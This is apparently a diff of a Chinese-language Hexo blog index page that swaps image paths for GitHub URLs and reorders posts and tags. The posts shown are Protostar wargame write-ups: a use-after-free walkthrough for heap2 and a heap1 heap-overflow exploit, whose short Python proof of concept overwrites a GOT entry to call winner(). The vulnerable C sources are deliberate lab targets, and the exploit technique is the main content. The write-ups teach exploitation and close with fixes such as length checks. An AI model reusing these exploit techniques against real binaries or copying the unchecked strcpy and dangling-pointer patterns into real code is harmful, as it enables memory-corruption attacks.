@@ -181,7 +181,7 @@
 <h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> auth &#123;</div><div class="line">  <span class="keyword">char</span> name[<span class="number">32</span>];</div><div class="line">  <span class="keyword">int</span> auth;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> auth *auth;</div><div class="line"><span class="keyword">char</span> *service;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> line[<span class="number">128</span>];</div><div class="line"></div><div class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"[ auth = %p, service = %p ]\n"</span>, auth, service);</div><div class="line"></div><div class="line">      <span class="keyword">if</span>(fgets(line, <span class="keyword">sizeof</span>(line), <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) <span class="keyword">break</span>;</div><div class="line">      </div><div class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(line, <span class="string">"auth "</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</div><div class="line">          auth = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(auth));</div><div class="line">          <span class="built_in">memset</span>(auth, <span class="number">0</span>, <span class="keyword">sizeof</span>(auth));</div><div class="line">          <span class="keyword">if</span>(<span class="built_in">strlen</span>(line + <span class="number">5</span>) &lt; <span class="number">31</span>) &#123;</div><div class="line">              <span class="built_in">strcpy</span>(auth-&gt;name, line + <span class="number">5</span>);</div><div class="line">          &#125;</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(line, <span class="string">"reset"</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</div><div class="line">          <span class="built_in">free</span>(auth);</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(line, <span class="string">"service"</span>, <span class="number">6</span>) == <span class="number">0</span>) &#123;</div><div class="line">          service = strdup(line + <span class="number">7</span>);</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(line, <span class="string">"login"</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</div><div class="line">          <span class="keyword">if</span>(auth-&gt;auth) &#123;</div><div class="line">              <span class="built_in">printf</span>(<span class="string">"you have logged in already!\n"</span>);</div><div class="line">          &#125; <span class="keyword">else</span> &#123;</div><div class="line">              <span class="built_in">printf</span>(<span class="string">"please enter your password\n"</span>);</div><div class="line">          &#125;</div><div class="line">      &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <h2 id="0x02-分析-amp-思考"><a href="#0x02-分析-amp-思考" class="headerlink" title="0x02 分析&amp;思考"></a>0x02 分析&amp;思考</h2><p>程序有4个命令，对<code>auth</code>这个结构体进行分配内存以及释放内存，然后有结构体里的<code>auth-&gt;auth</code>来决定是否授权。很明显让我们修改<code>auth-&gt;auth</code>的值。<br>reset命令释放<code>auth</code>但没有设为null，后面<code>auth-&gt;auth</code>发生引用。所以这里有个UAF漏洞。</p>
 <h2 id="0x03-调试-amp-hack"><a href="#0x03-调试-amp-hack" class="headerlink" title="0x03 调试&amp;hack"></a>0x03 调试&amp;hack</h2><p>1.在第一个printf处下个断点，观察每次分配和释放后堆，auth以及service的情况</p>
-<p>2.先输入<code>auth admin</code>，然后输入<code>login</code>试试<br><img src="/NULL-ME/NULL-ME.github.io.git/2017/04/13/Protostar-堆溢出系列学习-heap 2/Protostar-堆溢出系列学习-heap 2/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 2/0-0.png" alt="0-0"><br><img src="/NULL-ME/NULL-ME.github.io.git/2017/04/13/Protostar-堆溢出系列学习-heap 2/Protostar-堆溢出系列学习-heap 2/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 2/nologin.png" alt="nologin"><br>3.再输入<code>reset</code>释放堆内存<br><img src="/NULL-ME/NULL-ME.github.io.git/2017/04/13/Protostar-堆溢出系列学习-heap 2/Protostar-堆溢出系列学习-heap 2/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 2/0-1.png" alt="0-1"><br>4.输入<code>service</code>分配内存<br><img src="/NULL-ME/NULL-ME.github.io.git/2017/04/13/Protostar-堆溢出系列学习-heap 2/Protostar-堆溢出系列学习-heap 2/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 2/0-2.png" alt="0-2"><br>5.以上我们可以发现，给service分配的内存居然也指向auth的地址？因为之前free了auth，所以系统认为这段内存为可用，当再次分配的时候就会返回对应内存。基于此，我们继续给service分配内存，让其覆盖<code>auth-&gt;auth</code>的内存值。<br><img src="/NULL-ME/NULL-ME.github.io.git/2017/04/13/Protostar-堆溢出系列学习-heap 2/Protostar-堆溢出系列学习-heap 2/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 2/0-3.png" alt="0-3"><br>6.再次输入<code>login</code>命令<br><img src="/NULL-ME/NULL-ME.github.io.git/2017/04/13/Protostar-堆溢出系列学习-heap 2/Protostar-堆溢出系列学习-heap 2/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 2/0-4.png" alt="0-4"></p>
+<p>2.先输入<code>auth admin</code>，然后输入<code>login</code>试试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/0-0.png?raw=true" alt="0-0"><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/nologin.png?raw=true" alt="nologin"><br>3.再输入<code>reset</code>释放堆内存<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/0-1.png?raw=true" alt="0-1"><br>4.输入<code>service</code>分配内存<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/0-2.png?raw=true" alt="0-2"><br>5.以上我们可以发现，给service分配的内存居然也指向auth的地址？因为之前free了auth，所以系统认为这段内存为可用，当再次分配的时候就会返回对应内存。基于此，我们继续给service分配内存，让其覆盖<code>auth-&gt;auth</code>的内存值。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/0-3.png?raw=true" alt="0-3"><br>6.再次输入<code>login</code>命令<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/0-4.png?raw=true" alt="0-4"></p>
 <h2 id="0x04-一点感受"><a href="#0x04-一点感受" class="headerlink" title="0x04 一点感受"></a>0x04 一点感受</h2><p>通过这个例子简单的学习了UAF漏洞后，无疑free后不设为null，后果是不敢想象的。继续学习堆相关的漏洞利用。keep hack！</p>
 
       
@@ -215,6 +215,85 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="2017/04/13/Protostar-堆溢出系列学习-heap 2/Protostar-堆溢出系列学习-heap 2/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="2017/04/10/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/">Protostar-堆溢出系列学习-heap 1</a>
+    </h1>
+  
+
+        
+        <a href="2017/04/10/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/" class="archive-article-date">
+  	<time datetime="2017-04-10T03:12:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。</p>
+<h2 id="0x01-heap1"><a href="#0x01-heap1" class="headerlink" title="0x01 heap1"></a>0x01 heap1</h2><p>C代码</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> internet &#123;</div><div class="line">  <span class="keyword">int</span> priority;</div><div class="line">  <span class="keyword">char</span> *name;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"and we have a winner @ %d\n"</span>, time(<span class="literal">NULL</span>));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">struct</span> internet *i1, *i2, *i3;</div><div class="line"></div><div class="line">  i1 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> internet));</div><div class="line">  i1-&gt;priority = <span class="number">1</span>;</div><div class="line">  i1-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">  i2 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> internet));</div><div class="line">  i2-&gt;priority = <span class="number">2</span>;</div><div class="line">  i2-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">  <span class="built_in">strcpy</span>(i1-&gt;name, argv[<span class="number">1</span>]);</div><div class="line">  <span class="built_in">strcpy</span>(i2-&gt;name, argv[<span class="number">2</span>]);</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"and that's a wrap folks!\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="0x02-简单的分析-amp-思考"><a href="#0x02-简单的分析-amp-思考" class="headerlink" title="0x02 简单的分析&amp;思考"></a>0x02 简单的分析&amp;思考</h2><p>如果之前没有相关的漏洞利用经验的话，一时还是想不到怎么去利用这个堆溢出漏洞。但这里有两个<code>strcpy</code>，肯定是要去覆盖和修改某个地方的地址。<br>其实<code>strcpy</code>这个函数是非常危险的，既能溢出，又能对任意地址进行写操作。<br>在这个列子中，我们就借此去修改<code>printf</code>函数的GOT表。</p>
+<h2 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h2><p>1.查看堆分配情况<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%201/0-0.png?raw=true" alt="0-0"><br>2.查看汇编代码，找到执行入口<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%201/0-1.png?raw=true" alt="0-1"><br>3.首先利用第一个<code>strcpy</code>将i2的name指针改为GOT表地址，然后利用第二个<code>strcpy</code>向这个地址写入<code>winner</code>的地址，由此编写对应的Python PoC</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">padding = <span class="string">"AAAA"</span>*<span class="number">5</span></div><div class="line">put_got = <span class="keyword">struct</span>.pack(<span class="string">"I"</span>, <span class="number">0x8049774</span>) <span class="meta">#put的GOT表地址</span></div><div class="line">space = <span class="string">" "</span></div><div class="line">winner = <span class="keyword">struct</span>.pack(<span class="string">"I"</span>, <span class="number">0x8048494</span>) <span class="meta">#winner函数地址</span></div><div class="line"><span class="built_in">print</span> padding+put_got+space+winner</div></pre></td></tr></table></figure>
+<p>4.hack</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">user@protostar<span class="symbol">:/tmp</span>$ /opt/protostar/bin/heap1 <span class="string">`python  heap1.py`</span></div><div class="line"><span class="keyword">and</span> we have a winner @ <span class="number">1492452139</span></div></pre></td></tr></table></figure>
+<p><strong>成功执行winner函数</strong></p>
+<h1 id="0x04-一点感受"><a href="#0x04-一点感受" class="headerlink" title="0x04 一点感受"></a>0x04 一点感受</h1><p>学到现在，感受很多，对用户输入的数据完全信任是多么的可怕。可能有一万种的方法去利用这个漏洞达到代码执行。比如这里，将<code>strcpy</code>改为<code>strncpy</code>或者在copy前先检查下长度的话就能避免。所以写好一个有质量的代码是多么重要。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Protostar</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">栈溢出</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="2017/04/10/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/">展开全文 >></a>
         </p>
       
 
@@ -337,85 +416,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="2017/04/10/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/">Protostar-堆溢出系列学习-heap 1</a>
-    </h1>
-  
-
-        
-        <a href="2017/04/10/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/" class="archive-article-date">
-  	<time datetime="2017-04-10T03:12:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。</p>
-<h2 id="0x01-heap1"><a href="#0x01-heap1" class="headerlink" title="0x01 heap1"></a>0x01 heap1</h2><p>C代码</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> internet &#123;</div><div class="line">  <span class="keyword">int</span> priority;</div><div class="line">  <span class="keyword">char</span> *name;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"and we have a winner @ %d\n"</span>, time(<span class="literal">NULL</span>));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">struct</span> internet *i1, *i2, *i3;</div><div class="line"></div><div class="line">  i1 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> internet));</div><div class="line">  i1-&gt;priority = <span class="number">1</span>;</div><div class="line">  i1-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">  i2 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> internet));</div><div class="line">  i2-&gt;priority = <span class="number">2</span>;</div><div class="line">  i2-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">  <span class="built_in">strcpy</span>(i1-&gt;name, argv[<span class="number">1</span>]);</div><div class="line">  <span class="built_in">strcpy</span>(i2-&gt;name, argv[<span class="number">2</span>]);</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"and that's a wrap folks!\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h2 id="0x02-简单的分析-amp-思考"><a href="#0x02-简单的分析-amp-思考" class="headerlink" title="0x02 简单的分析&amp;思考"></a>0x02 简单的分析&amp;思考</h2><p>如果之前没有相关的漏洞利用经验的话，一时还是想不到怎么去利用这个堆溢出漏洞。但这里有两个<code>strcpy</code>，肯定是要去覆盖和修改某个地方的地址。<br>其实<code>strcpy</code>这个函数是非常危险的，既能溢出，又能对任意地址进行写操作。<br>在这个列子中，我们就借此去修改<code>printf</code>函数的GOT表。</p>
-<h2 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h2><p>1.查看堆分配情况<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%201/0-0.png?raw=true" alt="0-0"><br>2.查看汇编代码，找到执行入口<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%201/0-1.png?raw=true" alt="0-1"><br>3.首先利用第一个<code>strcpy</code>将i2的name指针改为GOT表地址，然后利用第二个<code>strcpy</code>向这个地址写入<code>winner</code>的地址，由此编写对应的Python PoC</p>
-<figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">padding = <span class="string">"AAAA"</span>*<span class="number">5</span></div><div class="line">put_got = <span class="keyword">struct</span>.pack(<span class="string">"I"</span>, <span class="number">0x8049774</span>) <span class="meta">#put的GOT表地址</span></div><div class="line">space = <span class="string">" "</span></div><div class="line">winner = <span class="keyword">struct</span>.pack(<span class="string">"I"</span>, <span class="number">0x8048494</span>) <span class="meta">#winner函数地址</span></div><div class="line"><span class="built_in">print</span> padding+put_got+space+winner</div></pre></td></tr></table></figure>
-<p>4.hack</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">user@protostar<span class="symbol">:/tmp</span>$ /opt/protostar/bin/heap1 <span class="string">`python  heap1.py`</span></div><div class="line"><span class="keyword">and</span> we have a winner @ <span class="number">1492452139</span></div></pre></td></tr></table></figure>
-<p><strong>成功执行winner函数</strong></p>
-<h1 id="0x04-一点感受"><a href="#0x04-一点感受" class="headerlink" title="0x04 一点感受"></a>0x04 一点感受</h1><p>学到现在，感受很多，对用户输入的数据完全信任是多么的可怕。可能有一万种的方法去利用这个漏洞达到代码执行。比如这里，将<code>strcpy</code>改为<code>strncpy</code>或者在copy前先检查下长度的话就能避免。所以写好一个有质量的代码是多么重要。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Protostar</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">栈溢出</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="2017/04/10/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/">展开全文 >></a>
         </p>
       
 
@@ -1493,18 +1493,6 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Protostar</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">UAF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">macOS内核</a>
               </li>
              
@@ -1513,7 +1501,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">堆溢出</a>
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Protostar</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1521,15 +1513,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">gdb</a>
+                <a href="javascript:void(0)" class="js-tag color4">堆溢出</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">调试</a>
+                <a href="javascript:void(0)" class="js-tag color4">UAF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1545,6 +1533,26 @@
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">gdb</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">调试</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">printf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">format</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">mach-o</a>
               </li>
              
@@ -1554,14 +1562,6 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">stub</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">printf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">format</a>
               </li>
              
               <li class="article-tag-list-item">
